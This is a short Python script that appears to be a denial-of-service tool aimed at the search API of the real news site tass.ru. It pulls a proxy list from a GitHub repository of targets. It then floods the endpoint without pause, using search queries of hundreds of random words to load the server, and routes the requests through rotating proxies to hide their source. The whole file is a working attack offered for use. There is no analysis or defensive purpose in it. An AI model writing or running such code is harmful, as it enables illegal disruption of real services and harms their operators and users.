import requests
from threading import Thread
import time
import random
from string import ascii_uppercase


PROXY_SOURCE = 'https://raw.githubusercontent.com/opengs/uashieldtargets/master/proxy.json'
HOSTS = []



def starts():
    while True:
        try:
            proxy = random.choice(HOSTS)
            proxy_formatted = {'http': f'http://{proxy["auth"]}@{proxy["ip"]}'}
            query = ''
            for i in range(300):
                query += '+' + ''.join(random.choice(ascii_uppercase) for i in range(12))
            params = {"type":[],"sections":[],"searchStr":query,"sort":"date","range":'null',"from":0,"size":20}
            r = requests.post('https://tass.ru/userApi/search', data=params, proxies=proxy_formatted)
            print(r.status_code)
            print('Success')
            time.sleep(1)
        except:
            print('Site is down')


if __name__ == '__main__':
    resp = requests.get(url=PROXY_SOURCE)
    HOSTS = resp.json()

    for _ in range(1):
        Thread(target=starts).start()
